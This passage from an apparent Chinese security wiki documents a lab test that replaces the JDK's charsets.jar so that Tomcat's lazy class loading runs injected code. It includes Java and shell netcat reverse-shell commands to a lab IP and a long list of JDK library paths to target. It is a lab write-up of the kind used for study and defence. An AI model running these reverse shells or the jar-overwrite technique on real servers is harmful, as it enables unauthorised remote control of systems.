</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【测试过程】</strong></p><p>果然是因为**<mark>已经被加载过</mark>**的原因，通过下面的命令可以看到 Ubuntu 下 charsets.jar 在 tomcat 启动的时候是不会加载的。</p><ol><li>查看 java 相关信息</li></ol><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>// 切换 jdk 版本
update-alternatives <span class="token parameter variable">--config</span> <span class="token function">java</span>

// 查看 jre 路径
<span class="token function">ls</span> <span class="token parameter variable">-lrt</span> /etc/alternatives/java

// 使用 <span class="token function">lsof</span> 命令查看文件是否被打开
<span class="token function">sudo</span> <span class="token function">lsof</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429174428-dpd7c4a.d9c37d01.png" alt="image" loading="lazy">​</p><ol start="2"><li>启动 tomcat（因为是懒加载的，所以直接覆盖了再启动在 linux 下也不会受影响，不像 win 会启动失败）</li></ol><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>root@refl4:/home/apache-tomcat-8.5.100/bin<span class="token comment"># ./catalina.sh start</span>
Using CATALINA_BASE:   /home/apache-tomcat-8.5.100
Using CATALINA_HOME:   /home/apache-tomcat-8.5.100
Using CATALINA_TMPDIR: /home/apache-tomcat-8.5.100/temp
Using JRE_HOME:        /usr
Using CLASSPATH:       /home/apache-tomcat-8.5.100/bin/bootstrap.jar:/home/apache-tomcat-8.5.100/bin/tomcat-juli.jar
Using CATALINA_OPTS:   
Tomcat started.

// 触发一次之后记得停止 tomcat 然后重启，清除缓存
root@refl4:/home/apache-tomcat-8.5.100/bin<span class="token comment"># ./catalina.sh stop</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>覆盖 <code>charsets.jar</code>​ 后访问类，触发类加载</li></ol><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429175632-ojbmb5g.fc6caa7c.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429175720-pzv80y6.8db94ed4.png" alt="image" loading="lazy">​</p><ol start="4"><li>反弹 shell 测试</li></ol><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>File</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    command <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;nc 192.168.202.61 4444 | /bin/sh | nc 192.168.202.61 5555&quot;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    command <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;nc 192.168.202.61 4444 | /bin/sh | nc 192.168.202.61 5555&quot;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="https://blog.csdn.net/mirocky/article/details/112674080" target="_blank" rel="noopener noreferrer">反弹 shell 常用命令_反弹 shell 命令<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>我这个环境的 nc 不支持 <code>-e</code>​ 也不支持 <code>-c</code>​，所以使用 <code>nc ip port1 | /bin/sh | nc ip port2</code>​ 来进行反弹 shell。</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># 但出于安全性考虑，很多 nc 没有进行 -e 的编译，执行后会出现下面的结果。</span>
nc: invalid option -- <span class="token string">&#39;c&#39;</span>
usage: <span class="token function">nc</span> <span class="token punctuation">[</span>-46CDdFhklNnrStUuvZz<span class="token punctuation">]</span> <span class="token punctuation">[</span>-I length<span class="token punctuation">]</span> <span class="token punctuation">[</span>-i interval<span class="token punctuation">]</span> <span class="token punctuation">[</span>-M ttl<span class="token punctuation">]</span>
          <span class="token punctuation">[</span>-m minttl<span class="token punctuation">]</span> <span class="token punctuation">[</span>-O length<span class="token punctuation">]</span> <span class="token punctuation">[</span>-P proxy_username<span class="token punctuation">]</span> <span class="token punctuation">[</span>-p source_port<span class="token punctuation">]</span>
          <span class="token punctuation">[</span>-q seconds<span class="token punctuation">]</span> <span class="token punctuation">[</span>-s source<span class="token punctuation">]</span> <span class="token punctuation">[</span>-T keyword<span class="token punctuation">]</span> <span class="token punctuation">[</span>-V rtable<span class="token punctuation">]</span> <span class="token punctuation">[</span>-W recvlimit<span class="token punctuation">]</span> <span class="token punctuation">[</span>-w timeout<span class="token punctuation">]</span>
          <span class="token punctuation">[</span>-X proxy_protocol<span class="token punctuation">]</span> <span class="token punctuation">[</span>-x proxy_address<span class="token punctuation">[</span>:port<span class="token punctuation">]</span><span class="token punctuation">]</span>           <span class="token punctuation">[</span>destination<span class="token punctuation">]</span> <span class="token punctuation">[</span>port<span class="token punctuation">]</span>

<span class="token comment"># 使用下面这种方式</span>
<span class="token function">nc</span> <span class="token number">192.168</span>.202.61 <span class="token number">4444</span> <span class="token operator">|</span> /bin/sh <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">192.168</span>.202.61 <span class="token number">5555</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>效果如下</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429182222-7pqg3by.33ba191a.png" alt="image" loading="lazy">​</p><p>修改 jar 包后编译上传成功反弹 shell。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429183038-jwlrxtz.34da28d7.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429182912-e1zyxj0.60aa3a56.png" alt="image" loading="lazy">​</p><h3 id="常见-jdk-目录记录" tabindex="-1"><a class="header-anchor" href="#常见-jdk-目录记录"><span>常见 jdk 目录记录</span></a></h3><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>jdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk<span class="token operator">-</span><span class="token number">6</span><span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk<span class="token operator">-</span><span class="token number">7</span><span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk<span class="token operator">-</span><span class="token number">8</span><span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk6<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk7<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk8<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk<span class="token operator">-</span><span class="token number">11.0</span><span class="token number">.3</span><span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">6</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">7</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk6<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk7<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk8<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk<span class="token operator">-</span><span class="token number">6</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk<span class="token operator">-</span><span class="token number">7</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk<span class="token operator">-</span><span class="token number">8</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>mnt<span class="token operator">/</span>jdk<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">6.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">7.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>java<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_111</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>java<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_121</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">7.0_51</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">7.0_76</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_60</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_66</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_74</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_91</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>oracle_jdk6<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>oracle_jdk7<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>oracle_jdk8<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_101</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_102</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_111</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_131</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_144</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_151</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_152</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_161</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_171</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_172</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_181</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_202</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk8u202<span class="token operator">-</span>b08<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>zulu<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>zulu<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>zulu<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>jdk<span class="token operator">/</span>instances<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">6.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>jdk<span class="token operator">/</span>instances<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">7.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>jdk<span class="token operator">/</span>instances<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>j2re1<span class="token punctuation">.</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>j2re1<span class="token punctuation">.</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>j2re1<span class="token punctuation">.</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>sun<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>sun<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>sun<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>j2sdk1<span class="token punctuation">.</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>j2sdk1<span class="token punctuation">.</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>j2sdk1<span class="token punctuation">.</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">13</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">9</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
